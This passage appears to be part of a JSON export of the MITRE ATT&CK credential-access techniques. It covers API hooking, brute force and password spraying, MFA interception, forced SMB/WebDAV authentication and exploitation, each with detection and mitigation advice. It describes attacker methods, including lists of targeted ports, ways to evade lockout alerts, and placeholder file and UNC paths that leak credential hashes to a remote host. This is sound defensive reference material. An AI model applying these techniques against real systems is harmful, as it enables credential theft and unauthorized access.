them to potential adversaries on unprivileged systems."}]},{"id":"T1056.004","name":"Credential API Hooking","description":"Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials. <a href=\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)</a> Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. \n\nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\n* <strong>Hooks procedures</strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hook Overview)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n* <strong>Import address table (IAT) hooking</strong>, which use modifications to a process’s IAT, where pointers to imported API functions are stored. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> <a href=\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adlice Software IAT Hooks Oct 2014)</a> <a href=\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MWRInfoSecurity Dynamic Hooking 2015)</a>\n* <strong>Inline hooking</strong>, which overwrites the first bytes in an API function to redirect code flow. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> <a href=\"https://www.exploit-db.com/docs/17802.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HighTech Bridge Inline Hooking Sept 2011)</a> <a href=\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MWRInfoSecurity Dynamic Hooking 2015)</a>\n\nIn Linux and macOS, adversaries may hook into system functions via the <code>LD_PRELOAD</code> (Linux) or <code>DYLD_INSERT_LIBRARIES</code> (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the <code>libc read</code> function leveraged by SSH or SCP. <a href=\"https://intezer.com/blog/research/new-linux-threat-symbiote/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Symbiote 2022)</a>","detection":"Monitor for calls to the <code>SetWindowsHookEx</code> and <code>SetWinEventHook</code> functions, which install a hook procedure. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hook Overview)</a> <a href=\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Detecting Hooks Sept 2012)</a> Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools <a href=\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Detecting Hooks Sept 2012)</a> <a href=\"https://github.com/prekageo/winhook\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PreKageo Winhook Jul 2011)</a> <a href=\"https://github.com/jay/gethooks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Jay GetHooks Sept 2011)</a> or by programmatically examining internal kernel structures. <a href=\"https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Zairon Hooking Dec 2006)</a> <a href=\"https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EyeofRa Detecting Hooking June 2017)</a>\n\nRootkits detectors <a href=\"http://www.gmer.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GMER Rootkits)</a> can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Snapshot)</a> to compare the in-memory IAT to the real addresses of the referenced functions. <a href=\"https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: StackExchange Hooks Jul 2012)</a> <a href=\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adlice Software IAT Hooks Oct 2014)</a>","platforms":["Windows","Linux","macOS"],"dataSources":["Process: Process Metadata","Process: OS API Execution"],"mitigations":[]}]},{"id":"T1110","name":"Brute Force","description":"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. <a href=\"https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro Pawn Storm Dec 2020)</a> Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. <a href=\"https://www.dragos.com/wp-content/uploads/CRASHOVERRIDE2018.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dragos Crashoverride 2018)</a> Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access. \n\nIf an adversary guesses the correct password but fails to login to a compromised account due to location-based conditional access policies, they may change their infrastructure until they match the victim’s location and therefore bypass those policies. <a href=\"https://www.reliaquest.com/blog/health-care-social-engineering-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ReliaQuest Health Care Social Engineering Campaign 2024)</a>","detection":"Monitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["User Account: User Account Authentication","Command: Command Execution","Application Log: Application Log Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."},{"id":"M1036","name":"Account Use Policies","description":"Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a> Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies. <a href=\"https://sec.okta.com/blockanonymizers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Block Anonymizing Services)</a>"}],"subTechniques":[{"id":"T1110.001","name":"Password Guessing","description":"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. <a href=\"https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Cleaver)</a>\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-086A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-068A 2018)</a>. Further, adversaries may abuse network device interfaces (such as <code>wlanAPI</code>) to brute force accessible wifi-router(s) via wireless authentication protocols. <a href=\"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Emotet 2020)</a>\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","detection":"Monitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["User Account: User Account Authentication","Application Log: Application Log Content"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."},{"id":"M1036","name":"Account Use Policies","description":"Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a> Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies. <a href=\"https://sec.okta.com/blockanonymizers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Block Anonymizing Services)</a>"},{"id":"M1051","name":"Update Software","description":"Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords."}]},{"id":"T1110.002","name":"Password Cracking","description":"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. <a href=\"https://en.wikipedia.org/wiki/Password_cracking\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Password cracking)</a> The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.","detection":"It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as OS Credential Dumping or Kerberoasting.","platforms":["Identity Provider","Linux","macOS","Network Devices","Office Suite","Windows"],"dataSources":["User Account: User Account Authentication","Application Log: Application Log Content"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."}]},{"id":"T1110.003","name":"Password Spraying","description":"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. <a href=\"http://www.blackhillsinfosec.com/?p=4645\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHillsInfosec Password Spraying)</a>\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-086A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-068A 2018)</a>\n\nIn order to avoid detection thresholds, adversaries may deliberately throttle password spraying attempts to avoid triggering security alerting. Additionally, adversaries may leverage LDAP and Kerberos authentication attempts, which are less likely to trigger high-visibility events such as Windows \"logon failure\" event ID 4625 that is commonly triggered by failed SMB connection attempts. <a href=\"https://www.microsoft.com/en-us/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Storm-0940)</a>","detection":"Monitor authentication logs for system and application login failures of Valid Accounts. Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs: <a href=\"https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trimarc Detecting Password Spraying)</a>\n\n* Domain Controllers: \"Audit Logon\" (Success &amp; Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success &amp; Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success &amp; Failure) for event ID 4648.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","Network Devices","Office Suite","SaaS","Windows","macOS"],"dataSources":["User Account: User Account Authentication","Application Log: Application Log Content"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."},{"id":"M1036","name":"Account Use Policies","description":"Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a> Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies. <a href=\"https://sec.okta.com/blockanonymizers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Block Anonymizing Services)</a>"}]},{"id":"T1110.004","name":"Credential Stuffing","description":"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP &amp; 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP &amp; 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-086A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-068A 2018)</a>","detection":"Monitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."},{"id":"M1036","name":"Account Use Policies","description":"Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a> Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies. <a href=\"https://sec.okta.com/blockanonymizers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Block Anonymizing Services)</a>"}]}]},{"id":"T1111","name":"Multi-Factor Authentication Interception","description":"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. <a href=\"https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M Trends 2011)</a>\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). <a href=\"https://gcn.com/cybersecurity/2011/06/rsa-confirms-its-tokens-used-in-lockheed-hack/282818/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCN RSA June 2011)</a>\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones. <a href=\"https://sec.okta.com/scatterswine\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Scatter Swine 2022)</a>","detection":"Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\n\nSimilar to Input Capture, keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.","platforms":["Linux","macOS","Windows"],"dataSources":["Driver: Driver Load","Process: OS API Execution","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1017","name":"User Training","description":"Remove smart cards when not in use."}],"subTechniques":[]},{"id":"T1187","name":"Forced Authentication","description":"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. <a href=\"https://en.wikipedia.org/wiki/Server_Message_Block\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Server Message Block)</a> This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. <a href=\"https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Didier Stevens WebDAV Traffic)</a> <a href=\"https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Managing WebDAV Security)</a>\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server. <a href=\"https://github.com/hob0/hashjacking\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Hashjacking)</a> With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials. <a href=\"https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Redirect to SMB)</a>\n\nThere are several different ways this can occur. <a href=\"https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Osanda Stealing NetNTLM Hashes)</a> Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-293A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT APT Energy Oct 2017)</a>\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-293A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT APT Energy Oct 2017)</a>\n\nAlternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network. <a href=\"https://www.rapid7.com/blog/post/2021/08/03/petitpotam-novel-attack-chain-can-fully-compromise-windows-domains-running-ad-cs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7)</a> <a href=\"https://github.com/topotam/PetitPotam\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub)</a>","detection":"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\n\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-293A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT APT Energy Oct 2017)</a>","platforms":["Windows"],"dataSources":["File: File Access","Network Traffic: Network Traffic Flow","File: File Modification","File: File Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained."},{"id":"M1037","name":"Filter Network Traffic","description":"Block SMB traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137. Filter or block WebDAV protocol traffic from exiting the network. If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with allowlisting. <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT SMB Security)</a> <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-293A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT APT Energy Oct 2017)</a>"}],"subTechniques":[]},{"id":"T1212","name":"Exploitation for Credential Access","description":"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. \n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is <code>MS14-068</code>, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. <a href=\"https://technet.microsoft.com/en-us/library/security/ms14-068.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Technet MS14-068)</a> <a href=\"https://adsecurity.org/?p=1515\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Detecting Forged Tickets)</a> Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges. <a href=\"https://www.bugcrowd.com/glossary/replay-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bugcrowd Replay Attack)</a> <a href=\"https://www.comparitech.com/blog/information-security/what-is-a-replay-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Comparitech Replay Attack)</a> <a href=\"https://x.com/MsftSecIntel/status/1671579359994343425\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Midnight Blizzard Replay Attack)</a>\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Storm-0558 techniques for unauthorized email access)</a>\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.","platforms":["Linux","Windows","macOS","Identity Provider"],"dataSources":["User Account: User Account Authentication","Process: Process Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application 